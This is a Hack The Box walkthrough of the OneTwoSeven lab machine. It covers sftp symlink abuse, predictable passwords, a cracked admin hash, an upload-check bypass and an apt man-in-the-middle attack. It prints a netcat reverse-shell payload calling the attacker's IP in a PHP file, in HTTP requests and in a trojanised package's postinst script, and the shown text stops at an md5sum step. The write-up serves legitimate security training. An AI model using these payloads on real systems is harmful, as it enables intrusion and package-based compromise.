---
layout: post
title: Hack The Box - OneTwoSeven
categories: hack-the-box
tags: [linux, web, rce, php, code-analysis, networking, ssh]
description: My write-up for OneTwoSeven from Hack The Box.
image: /hackthebox/onetwoseven/0.png
---

<hr>
## Quick Summary 
<br> Hey guys today OneTwoSeven retired and here's my write-up about it. It was a very special box and I enjoyed every part of it, especially the `apt` man in the middle attack part. Definitely one of my favorite boxes. It's a Linux box and its ip is `10.10.10.133`, I added it to `/etc/hosts` as `onetwoseven.htb`. Let's jump right in !
![](/images/hackthebox/onetwoseven/0.png)
<hr>
## Nmap
<br> As always we will start with `nmap` to scan for open ports and services :
`nmap -sV -sT -sC onetwoseven.htb`
![](/images/hackthebox/onetwoseven/1.png)
<br> Only `http` on port 80 and `ssh`.
<br>
<hr>
## Web Enumeration
<br> By going to `http://onetwoseven.htb` we see this nice website :
![](/images/hackthebox/onetwoseven/2.png)
<br> There's a sign-up button, and some other info :
![](/images/hackthebox/onetwoseven/3.png)
<br>
<br>
![](/images/hackthebox/onetwoseven/4.png)
<br>
<br>
![](/images/hackthebox/onetwoseven/5.png)
<br>
<br>
![](/images/hackthebox/onetwoseven/6.png)
<br> So now we know that `sftp` is running, and we also know that if we tried to bruteforce anything we'll get banned. 
<br> If we look at the navigation bar we can see 3 pages :
![](/images/hackthebox/onetwoseven/7.png)
<br> Home is where we are, statistics just shows stuff like up-time, banned ip addresses etc.., there's a page titled Admin and it's disabled, let's look at the `html` source :
```
        <!-- Only enable link if access from trusted networks admin/20190212 -->
        <!-- Added localhost admin/20190214 -->
		  <li class="nav-item"><a id="adminlink" class="nav-link disabled" href="http://onetwoseven.htb:60080/">Admin</a></li>

```
<br> Admin's page is on port 60080 and it's only accessible from `localhost`, so we can skip that for now.
<br> I clicked on the sign-up button and got this page :
![](/images/hackthebox/onetwoseven/8.png)
<br> We have credentials for `sftp` : `ots-5MWI1ZmI : f991b5fb`
<br> and we also have a personal home page (http://onetwoseven.htb/~ots-5MWI1ZmI/) which looks like this :
![](/images/hackthebox/onetwoseven/9.png)
```
<!DOCTYPE html>
<html>
<head>
<title>Nothing here.</title>
<style>body { margin:0; padding:0; background:url("/dist/img/abstract-architecture-attractive-988873.jpg") no-repeat center center fixed; -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover; }</style>
</head>
<body></body>
</html>
```
<br>
<hr>
## SFTP, User Flag
<br> With the `sftp` credentials we have we can access the root directory of our home page :
```
root@kali:~/Desktop/HTB/boxes/onetwoseven# sftp ots-5MWI1ZmI@onetwoseven.htb
ots-5MWI1ZmI@onetwoseven.htb's password:
Connected to ots-5MWI1ZmI@onetwoseven.htb.
sftp> ls
public_html
sftp> ls -la
drwxr-xr-x    3 0        0            4096 Aug 29 19:57 .
drwxr-xr-x    3 0        0            4096 Aug 29 19:57 ..
drwxr-xr-x    2 1010     1010         4096 Feb 15  2019 public_html
sftp> pwd
Remote working directory: /
sftp> cd public_html
sftp> ls -la
drwxr-xr-x    2 1010     1010         4096 Feb 15  2019 .
drwxr-xr-x    3 0        0            4096 Aug 29 19:57 ..
-rw-r--r--    1 1010     1010          349 Feb 15  2019 index.html
sftp> 
```
<br> You may wonder why we didn't see an open port for `sftp`, that's because `sftp` runs on top of `ssh` by default, check [this](https://www.jscape.com/blog/what-port-does-sftp-use).
<br> I created a `php` test file and uploaded it :
```
<?php
echo 'test';
?>
```

```
sftp> put test.php
Uploading test.php to /public_html/test.php
test.php                                                                                                                                                                         100%   22     0.1KB/s   00:00    
sftp>  
```
<br> Unfortunately it will respond with `403` to any uploaded `php` file :
![](/images/hackthebox/onetwoseven/10.png)
<br> I checked the commands list of `sftp` and saw that I can create symlinks with `symlink` :
```
sftp> help
Available commands:
bye                                Quit sftp
cd path                            Change remote directory to 'path'
chgrp grp path                     Change group of file 'path' to 'grp'
chmod mode path                    Change permissions of file 'path' to 'mode'
chown own path                     Change owner of file 'path' to 'own'
df [-hi] [path]                    Display statistics for current directory or
                                   filesystem containing 'path'
exit                               Quit sftp
get [-afPpRr] remote [local]       Download file
reget [-fPpRr] remote [local]      Resume download file
reput [-fPpRr] [local] remote      Resume upload file
help                               Display this help text
lcd path                           Change local directory to 'path'
lls [ls-options [path]]            Display local directory listing
lmkdir path                        Create local directory
ln [-s] oldpath newpath            Link remote file (-s for symlink)
lpwd                               Print local working directory
ls [-1afhlnrSt] [path]             Display remote directory listing
lumask umask                       Set local umask to 'umask'
mkdir path                         Create remote directory
progress                           Toggle display of progress meter
put [-afPpRr] local [remote]       Upload file
pwd                                Display remote working directory
quit                               Quit sftp
rename oldpath newpath             Rename remote file
rm path                            Delete remote file
rmdir path                         Remove remote directory
symlink oldpath newpath            Symlink remote file
version                            Show SFTP version
!command                           Execute 'command' in local shell
!                                  Escape to local shell
?                                  Synonym for help
sftp> 
```
<br> So I tried to create a symlink to `/etc/passwd` and it worked :
```
sftp> symlink /etc/passwd passwd
sftp> ls -la
drwxr-xr-x    2 1010     1010         4096 Aug 29 20:14 .
drwxr-xr-x    3 0        0            4096 Aug 29 19:57 ..
-rw-r--r--    1 1010     1010          349 Feb 15  2019 index.html
lrwxrwxrwx    1 1010     1010           11 Aug 29 20:14 passwd
sftp> 
```
![](/images/hackthebox/onetwoseven/11.png)
<br> As you can see there's a user with `localhost`'s ip, that can be helpful but we need to know his password, we already got the username : `ots-yODc2NGQ`.
<br> I wanted to know how usernames were generated so I made some assumptions and tested them.
<br> Usernames were following the same pattern which was `ots-` then a base-64 encoded string , I tried to decode the string from my username (`5MWI1ZmI`) but I got nothing readable, so I tried to encode my password (`f991b5fb`) :
```
root@kali:~/Desktop/HTB/boxes/onetwoseven# echo f991b5fb | base64
Zjk5MWI1ZmIK
```
<br> So the string in usernames is part of the base-64 encoded password, but how these password are generated in the first place ? my password looked like `hex` but after decoding it I got nothing readable so I guessed it might be a part of an `md5` hash, but what hash ? I tried the `md5` hash of my ip :
```
root@kali:~/Desktop/HTB/boxes/onetwoseven# python
Python 2.7.16 (default, Apr  6 2019, 01:42:57)
[GCC 8.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from hashlib import md5
>>> print md5("10.10.xx.xx").hexdigest()
f991b5fbxxxxxxxxxxxxxxxxxxxxxxxx
>>>

```
<br> So passwords are just the first 8 chars of the ip's md5 hash, now we can generate the password for `ots-yODc2NGQ` based on the same idea :
```
>>> print md5("127.0.0.1").hexdigest()
f528764d624db129b32c21fbca0cb8d6
>>> 
```
<br> `ots-yODc2NGQ : f528764d`  , let's try it :
```
root@kali:~/Desktop/HTB/boxes/onetwoseven# sftp ots-yODc2NGQ@onetwoseven.htb
ots-yODc2NGQ@onetwoseven.htb's password:
Connected to ots-yODc2NGQ@onetwoseven.htb.
sftp> ls -la
drwxr-xr-x    3 0        0            4096 Feb 15  2019 .
drwxr-xr-x    3 0        0            4096 Feb 15  2019 ..
drwxr-xr-x    2 999      999          4096 Feb 15  2019 public_html
-r--r-----    1 0        999            33 Feb 15  2019 user.txt
sftp> get user.txt
Fetching /user.txt to user.txt
/user.txt                                                                                                                                                                        100%   33     0.2KB/s   00:00    
sftp>
```
![](/images/hackthebox/onetwoseven/12.png)
<br> We owned user.
<br>
<hr>
## Admin panel, Arbitrary File Upload, RCE
<br> I tried `ssh` but I got this message :
```
root@kali:~/Desktop/HTB/boxes/onetwoseven# ssh ots-yODc2NGQ@onetwoseven.htb
ots-yODc2NGQ@onetwoseven.htb's password:
This service allows sftp connections only.
Connection to onetwoseven.htb closed.
```
<br> However we can still use it to forward ports, let's forward port `60080` :
```
root@kali:~/Desktop/HTB/boxes/onetwoseven# ssh -nNT -L 60080:127.0.0.1:60080 ots-yODc2NGQ@onetwoseven.htb
ots-yODc2NGQ@onetwoseven.htb's password:
```
![](/images/hackthebox/onetwoseven/13.png)
<br> We need credentials to login, I used the `symlink` command and created a symlink to `/var/www` :
```
sftp> symlink /var/www www
sftp> 
```
![](/images/hackthebox/onetwoseven/14.png)
<br>
<br>
![](/images/hackthebox/onetwoseven/15.png)
<br> I downloaded `login.php.swp` : 
![](/images/hackthebox/onetwoseven/16.png)
<br> Because it's a `vim` swap file it had a lot of unreadable characters so I used strings :
```
root@kali:~/Desktop/HTB/boxes/onetwoseven# strings login.php.swp > login.php
root@kali:~/Desktop/HTB/boxes/onetwoseven#
```
<br> `login.php` :
```
b0VIM 8.0
u\k*
root
onetwoseven
/var/www/html-admin/login.php
utf-8
3210
#"! 
	    <table>
            <h4 class = "form-signin-heading"><font size="-1" color="red"><?php echo $msg; ?></font></h4>
         <form action="/login.php" method="post">
      
      <div class = "container">
      
      </div> <!-- /container -->
         ?>
            }
              }
    				      
		   
	      if ($_POST['username'] == 'ots-admin' && hash('sha256',$_POST['password']) == '11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8') {
            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
            
            $msg = '';
          <?php
        <h2 class="featurette-heading">Login to the kingdom.<span class="text-muted"> Up up and away!</span></h2>
      <div class="col-md-12">
    <div class="row featurette">
    <!-- START THE FEATURETTES -->
  <div class="container marketing">
  <!-- Wrap the rest of the page in another container to center all the content. -->
  ================================================== -->
  <!-- Marketing messaging and featurettes
  </div>
    </a>
      <span class="sr-only">Next</span>
      <span class="carousel-control-next-icon" aria-hidden="true"></span>
    <a class="carousel-control-next" href="#myCarousel" role="button" data-slide="next">
    </a>
      <span class="sr-only">Previous</span>
      <span class="carousel-control-prev-icon" aria-hidden="true"></span>
    <a class="carousel-control-prev" href="#myCarousel" role="button" data-slide="prev">
    </div>
      </div>
        </div>
          </div>
            <p>Administration backend. For administrators only.</p>
            <h1>OneTwoSeven Administration</h1>
          <div class="carousel-caption text-left">
        <div class="container">
        <img src="dist/img/ai-codes-coding-97077.jpg">
      <div class="carousel-item active">
    <div class="carousel-inner">
    </ol>
      <li data-target="#myCarousel" data-slide-to="0" class="active"></li>
    <ol class="carousel-indicators">
  <div id="myCarousel" class="carousel slide" data-ride="carousel">
<main role="main">
</header>
  </nav>
    </div>
    <div class="collapse navbar-collapse" id="navbarCollapse">
    </button>
      <span class="navbar-toggler-icon"></span>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
    <a class="navbar-brand" href="/login.php">OneTwoSeven - Administration Backend</a>
  <nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
    <header>
  <body>
  </head>
    <link href="carousel.css" rel="stylesheet">
    <!-- Custom styles for this template -->
    </style>
      @media (min-width: 768px) { .bd-placeholder-img-lg { font-size: 3.5rem; } }
      .bd-placeholder-img { font-size: 1.125rem; text-anchor: middle; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; }
    <style>
    <link href="/dist/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
    <!-- Bootstrap core CSS -->
    <title>OneTwoSeven</title>
    <meta name="generator" content="Jekyll v3.8.5">
    <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta charset="utf-8">
  <head>
<html lang="en">
<!doctype html>
<?php session_start(); if (isset ($_SESSION['username'])) { header("Location: /menu.php"); } ?>
<?php if ( $_SERVER['SERVER_PORT'] != 60080 ) { die(); } ?>
</html>
      <script>window.jQuery || document.write('<script src="/docs/4.3/assets/js/vendor/jquery-slim.min.js"><\/script>')</script><script src="dist/js/bootstrap.bundle.min.js" crossorigin="anonymous"></script></body>
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
</main>
  </footer>
    <p>&copy; 2019 OneTwoSeven, Dec. &middot; <a href="#">Privacy</a> &middot; <a href="#">Terms</a></p>
    <p class="float-right"><a href="#">Back to top</a></p>
  <footer class="container">
  <!-- FOOTER -->
  </div><!-- /.container -->
    <!-- /END THE FEATURETTES -->
    <hr class="featurette-divider">
    </div>
	     </div>
         </form>
            </table>
              <tr><td colspan="2"><center><button type="submit" name="login">Login</button></center></td></tr>
              <tr><td><b>Password:</b></td><td><input type="password" name="password" size="40" required></td></tr>
              <tr><td><b>Username:</b></td><td><input type="text" name="username" size="40" required autofocus></td></tr>
	    <table>
            <h4 class = "form-signin-heading"><font size="-1" color="red"><?php echo $msg; ?></font></h4>
         <form action="/login.php" method="post">
      
      <div class = "container">
      
      </div> <!-- /container -->
         ?>
            }
              }
                  $msg = 'Wrong username or password.';
              } else {
		  header("Location: /menu.php");
                  $_SESSION['username'] = 'ots-admin';
```
<br> The credentials are hardcoded, however the password is hashed :
```
if ($_POST['username'] == 'ots-admin' && hash('sha256',$_POST['password']) == '11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8') { 
```
<br> [Crackstation]([https://crackstation.net](https://crackstation.net/)) was able to crack it :
![](/images/hackthebox/onetwoseven/17.png)
<br> `ots-admin : Homesweethome1` :
![](/images/hackthebox/onetwoseven/18.png)
<br>
<br>
![](/images/hackthebox/onetwoseven/19.png)
<br> There's a plugin upload form and some installed plugins above it, additionally there's a small button to download the module's `php` source from the directory `/addons`:
![](/images/hackthebox/onetwoseven/20.png)
<br> If we can upload plugins then we got `RCE`, the form submit button is disabled but we can easily change that :
![](/images/hackthebox/onetwoseven/21.png)
<br>
<br>
![](/images/hackthebox/onetwoseven/22.png)
<br>
<br>
![](/images/hackthebox/onetwoseven/23.png)
<br>
<br>
![](/images/hackthebox/onetwoseven/24.png)
<br> `rev.php` :
```
<?php
system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.xx.xx 1337 >/tmp/f');
?>
```
![](/images/hackthebox/onetwoseven/25.png)
<br>
<br>
![](/images/hackthebox/onetwoseven/26.png)
<br> It sent the request to `addon-upload.php` and the response was 404.
```
POST /addon-upload.php HTTP/1.1
Host: 127.0.0.1:60080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:60080/menu.php?addon=addons/ots-fs.php
Content-Type: multipart/form-data; boundary=---------------------------171386507112993851681929761040
Content-Length: 326
Cookie: PHPSESSID=ijo6tb6dnflvsm803pivm8dcd2
Connection: close
Upgrade-Insecure-Requests: 1


-----------------------------171386507112993851681929761040

Content-Disposition: form-data; name="addon"; filename="rev.php"
Content-Type: application/x-php

<?php
system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.xx.xx 1337 >/tmp/f');
?>

-----------------------------171386507112993851681929761040--
```
<br>  If we check the `Addon manager` plugin we can see some interesting things :
![](/images/hackthebox/onetwoseven/27.png)
<br> First thing is the rewrite rules, any request sent to `addon-upload.php` and `addon-download.php` gets sent to `addons/ots-man-addon.php`. There's also a small note that says "Disabling a feature through htaccess leads to 404 errors for now.", This explains why we got 404 when attempting to upload a plugin, however the download feature isn't disabled and I was able to download the `Addon manager` plugin :
![](/images/hackthebox/onetwoseven/28.png)
<br> Since both requests to `addon-upload.php` and `addon-download.php` go to `ots-man-addon.php`, we have to find a way to exploit `ots-man-addon.php` and just use `addon-download.php` because it's not disabled. 
<br> `ots-man-addon.php` : 
```
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /login.php"); }; if ( strpos($_SERVER['REQUEST_URI'], '/addons/') !== false ) { die(); };
# OneTwoSeven Admin Plugin
# OTS Addon Manager
switch (true) {
	# Upload addon to addons folder.
	case preg_match('/\/addon-upload.php/',$_SERVER['REQUEST_URI']):
		if(isset($_FILES['addon'])){
			$errors= array();
			$file_name = basename($_FILES['addon']['name']);
			$file_size =$_FILES['addon']['size'];
			$file_tmp =$_FILES['addon']['tmp_name'];

			if($file_size > 20000){
				$errors[]='Module too big for addon manager. Please upload manually.';
			}

			if(empty($errors)==true) {
				move_uploaded_file($file_tmp,$file_name);
				header("Location: /menu.php");
				header("Content-Type: text/plain");
				echo "File uploaded successfull.y";
			} else {
				header("Location: /menu.php");
				header("Content-Type: text/plain");
				echo "Error uploading the file: ";
				print_r($errors);
			}
		}
		break;
	# Download addon from addons folder.
	case preg_match('/\/addon-download.php/',$_SERVER['REQUEST_URI']):
		if ($_GET['addon']) {
			$addon_file = basename($_GET['addon']);
			if ( file_exists($addon_file) ) {
				header("Content-Disposition: attachment; filename=$addon_file");
				header("Content-Type: text/plain");
				readfile($addon_file);
			} else {
				header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
				die();
			}
		}
		break;
	default:
		echo "The addon manager must not be executed directly but only via<br>";
		echo "the provided RewriteRules:<br><hr>";
		echo "RewriteEngine On<br>";
		echo "RewriteRule ^addon-upload.php   addons/ots-man-addon.php [L]<br>";
		echo "RewriteRule ^addon-download.php addons/ots-man-addon.php [L]<br><hr>";
		echo "By commenting individual RewriteRules you can disable single<br>";
		echo "features (i.e. for security reasons)<br><br>";
		echo "<font size='-2'>Please note: Disabling a feature through htaccess leads to 404 errors for now.</font>";
		break;
}
?>
```
<br> This part of the code tells us what we need to do :
```
	case preg_match('/\/addon-upload.php/',$_SERVER['REQUEST_URI']):
		if(isset($_FILES['addon'])){
			$errors= array();
			$file_name = basename($_FILES['addon']['name']);
			$file_size =$_FILES['addon']['size'];
			$file_tmp =$_FILES['addon']['tmp_name'];

			if($file_size > 20000){
				$errors[]='Module too big for addon manager. Please upload manually.';
			}

			if(empty($errors)==true) {
				move_uploaded_file($file_tmp,$file_name);
				header("Location: /menu.php");
				header("Content-Type: text/plain");
				echo "File uploaded successfull.y";
```
<br> We need to have `/addon-upload.php` in the request URI, we can't request `/addon-upload.php` directly because it's disabled but we can just put a useless `GET` parameter with the value `/addon-upload.php`,  and it will pass the check.
<br> It takes the addon name from the `GET` parameter `addon` so we have to add that parameter to the request URI.
<br> So the request URI looks like this : 
```
/addon-download.php?addon=addons/rev.php&test=/addon-upload.php
``` 
<br> Request :
```
POST /addon-download.php?addon=addons/rev.php&test=/addon-upload.php HTTP/1.1
Host: 127.0.0.1:60080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:60080/menu.php?addon=addons/ots-fs.php
Content-Type: multipart/form-data; boundary=---------------------------171386507112993851681929761040
Content-Length: 326
Cookie: PHPSESSID=ijo6tb6dnflvsm803pivm8dcd2
Connection: close
Upgrade-Insecure-Requests: 1


-----------------------------171386507112993851681929761040

Content-Disposition: form-data; name="addon"; filename="rev.php"
Content-Type: application/x-php

<?php
system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.xx.xx 1337 >/tmp/f');
?>

-----------------------------171386507112993851681929761040--
```
<br> Response :
```
HTTP/1.1 302 Found
Date: Thu, 29 Aug 2019 20:56:24 GMT
Server: Apache/2.4.25 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /menu.php
Content-Length: 27
Connection: close
Content-Type: text/plain;charset=UTF-8


File uploaded successfull.y
```
<br> Now if we check `/addons`, `rev.php` is there :
![](/images/hackthebox/onetwoseven/29.png)
<br>
<br>
![](/images/hackthebox/onetwoseven/30.png)
<hr>
## APT MITM, Root Flag
<br> As `www-admin-data`  we can run `apt-get update` and `apt-get upgrade` as root without a password :
```
www-admin-data@onetwoseven:/$ sudo -l
Matching Defaults entries for www-admin-data on onetwoseven:
    env_reset, env_keep+="ftp_proxy http_proxy https_proxy no_proxy",
    mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-admin-data may run the following commands on onetwoseven:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade
```
<br> Also when using `sudo` it doesn't reset these environment variables : `ftp_proxy`, `http_proxy`, `https_proxy`
<br> We can create a fake apt repository and add a malicious package that gives us code execution. Then we can run a proxy server (burp or anything else) and set the `http_proxy` variable to our server. After that we can make the proxy server use our fake repository instead of the real one by adding an entry in `/etc/hosts`. Finally when we run `apt-get update && apt-get upgrade` it will attempt to install our malicious package that will give us a root shell. This [article](https://versprite.com/blog/apt-mitm-package-injection/) was very helpful.
<br> Let's check the sources that box is using first :
```
www-admin-data@onetwoseven:/$ cat /etc/apt/sources.list
# 

# deb cdrom:[devuan_ascii_2.0.0_amd64_netinst]/ ascii main non-free

#deb cdrom:[devuan_ascii_2.0.0_amd64_netinst]/ ascii main non-free

deb http://de.deb.devuan.org/merged ascii main
# deb-src http://de.deb.devuan.org/merged ascii main

deb http://de.deb.devuan.org/merged ascii-security main
# deb-src http://de.deb.devuan.org/merged ascii-security main

deb http://de.deb.devuan.org/merged ascii-updates main
# deb-src http://de.deb.devuan.org/merged ascii-updates main
www-admin-data@onetwoseven:/$ cat /etc/apt/sources.list.d/onetwoseven.list 
# OneTwoSeven special packages - not yet in use
deb http://packages.onetwoseven.htb/devuan ascii main
www-admin-data@onetwoseven:/$ 
```
<br> In `/etc/apt/sources.list.d/onetwoseven.list` there's an entry for `packages.onetwoseven.htb`. Let's use that.
<br> I started another burp listener on port 8181 :
![](/images/hackthebox/onetwoseven/31.png)
<br> And I added `packages.onetwoseven.htb` to my `hosts` file and made it point to my ip :
![](/images/hackthebox/onetwoseven/32.png)
<br> Now any request to `packages.onetwoseven.htb` through the proxy server will be sent to my ip. Now we need to create the fake repository and the malicious package.
<br> I chose `telnet` :
```
www-admin-data@onetwoseven:/$ dpkg -l | grep telnet
ii  telnet                                 0.17-41                            amd64        basic telnet client
www-admin-data@onetwoseven:/$ apt-cache show telnet 
Package: telnet
Version: 0.17-41
Installed-Size: 157
Maintainer: Mats Erik Andersson <mats.andersson@gisladisker.se>
Architecture: amd64
Replaces: netstd
Provides: telnet-client
Depends: netbase, libc6 (>= 2.15), libstdc++6 (>= 5)
Description: basic telnet client
Description-md5: 80f238fa65c82c04a1590f2a062f47bb
Source: netkit-telnet
Tag: admin::login, interface::shell, network::client, protocol::ipv6,
 protocol::telnet, role::program, uitoolkit::ncurses, use::login
Section: net
Priority: standard
Filename: pool/DEBIAN/main/n/netkit-telnet/telnet_0.17-41_amd64.deb
Size: 72008
MD5sum: 3409d7e40403699b890c68323e200874
SHA256: 95aa315eb5b3be12fc7a91a8d7ee8eba7af99120641067ec39694200e034a5ae
```
<br> The version on the box is `0.17-41`, I searched for it and downloaded it :
```
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# wget ftp.br.debian.org/debian/pool/main/n/netkit-telnet/telnet_0.17-41_amd64.deb
--2019-08-29 23:10:54--  http://ftp.br.debian.org/debian/pool/main/n/netkit-telnet/telnet_0.17-41_amd64.deb
Resolving ftp.br.debian.org (ftp.br.debian.org)... 200.236.31.3, 2801:82:80ff:8000::4
Connecting to ftp.br.debian.org (ftp.br.debian.org)|200.236.31.3|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 72008 (70K) [application/x-debian-package]
Saving to: ‘telnet_0.17-41_amd64.deb’

telnet_0.17-41_amd64.deb                             100%[=====================================================================================================================>]  70.32K   113KB/s    in 0.6s    

2019-08-29 23:10:56 (113 KB/s) - ‘telnet_0.17-41_amd64.deb’ saved [72008/72008]

root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# file telnet_0.17-41_amd64.deb 
telnet_0.17-41_amd64.deb: Debian binary package (format 2.0)
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# 
```
<br> We will unpack it :
```
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# dpkg-deb -R ./telnet_0.17-41_amd64.deb ./extract
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# ls -la ./extract/
total 16
drwxr-xr-x 4 root root 4096 Aug 29 23:12 .
drwxr-xr-x 3 root root 4096 Aug 29 23:12 ..
drwxr-xr-x 2 root root 4096 Nov  7  2016 DEBIAN
drwxr-xr-x 4 root root 4096 Nov  7  2016 usr
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# 
```
<br> And add a reverse shell payload in the post install script :
```
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/extract/DEBIAN# nano postinst
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/extract/DEBIAN# cat postinst
#!/bin/sh
# $Id: postinst,v 1.4 2000/08/23 10:08:42 herbert Exp $

set -e

update-alternatives --install /usr/bin/telnet telnet /usr/bin/telnet.netkit 100 \
                    --slave /usr/share/man/man1/telnet.1.gz telnet.1.gz \
                                /usr/share/man/man1/telnet.netkit.1.gz

# Automatically added by dh_installmenu
if [ "$1" = "configure" ] && [ -x "`which update-menus 2>/dev/null`" ]; then
        update-menus
fi
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.xx.xx 1338 >/tmp/f
# End automatically added section

root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/extract/DEBIAN# 
```
<br> Then we will pack it again and change the version number :
```
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# dpkg-deb -b extract/ telnet_0.17-42_amd64.deb
dpkg-deb: building package 'telnet' in 'telnet_0.17-42_amd64.deb'.
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# ls -la
total 156
drwxr-xr-x 3 root root  4096 Aug 29 23:18 .
drwxr-xr-x 3 root root  4096 Aug 29 23:16 ..
drwxr-xr-x 4 root root  4096 Aug 29 23:12 extract
-rw-r--r-- 1 root root 72008 Nov 10  2016 telnet_0.17-41_amd64.deb
-rw-r--r-- 1 root root 72176 Aug 29 23:18 telnet_0.17-42_amd64.deb
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# 
```
<br> What's left is to create the repository, its name will be `devuan` as we saw in the sources list :
```
www-admin-data@onetwoseven:/$ cat /etc/apt/sources.list.d/onetwoseven.list 
# OneTwoSeven special packages - not yet in use
deb http://packages.onetwoseven.htb/devuan ascii main
```
<br> The path for the package will be :
```
pool/DEBIAN/main/n/netkit-telnet/telnet_0.17-42_amd64.deb
```
<br> as we saw in the `apt-cache` result :
```
www-admin-data@onetwoseven:/$ apt-cache show telnet 
Package: telnet
Version: 0.17-41
Installed-Size: 157
Maintainer: Mats Erik Andersson <mats.andersson@gisladisker.se>
Architecture: amd64
Replaces: netstd
Provides: telnet-client
Depends: netbase, libc6 (>= 2.15), libstdc++6 (>= 5)
Description: basic telnet client
Description-md5: 80f238fa65c82c04a1590f2a062f47bb
Source: netkit-telnet
Tag: admin::login, interface::shell, network::client, protocol::ipv6,
 protocol::telnet, role::program, uitoolkit::ncurses, use::login
Section: net
Priority: standard
Filename: pool/DEBIAN/main/n/netkit-telnet/telnet_0.17-41_amd64.deb
Size: 72008
MD5sum: 3409d7e40403699b890c68323e200874
SHA256: 95aa315eb5b3be12fc7a91a8d7ee8eba7af99120641067ec39694200e034a5ae
```

```
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# mkdir devuan && cd $_
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan# mkdir pool && cd $_
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool# mkdir DEBIAN && cd $_
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN# mkdir main && cd $_
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main# mkdir n && cd $_
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n# mkdir netkit-telnet
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n# cd netkit-telnet/
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# cp ../../../../../../telnet_0.17-42_amd64.deb .
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# ls -la
total 80
drwxr-xr-x 2 root root  4096 Aug 29 23:24 .
drwxr-xr-x 3 root root  4096 Aug 29 23:23 ..
-rw-r--r-- 1 root root 72176 Aug 29 23:24 telnet_0.17-42_amd64.deb
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# 
```
<br> Now we need to create a `Packages` file, we'll copy the stuff from `apt-cache show telnet` and change the version number, size and the hashes. 
```
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# ls -la
total 80
drwxr-xr-x 2 root root  4096 Aug 29 23:24 .
drwxr-xr-x 3 root root  4096 Aug 29 23:23 ..
-rw-r--r-- 1 root root 72176 Aug 29 23:24 telnet_0.17-42_amd64.deb
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# md5sum telnet_0.17-42_amd64.deb                                                                                       
2d29b3d5179226f9a772e370c1df05d9  telnet_0.17-42_amd64.deb
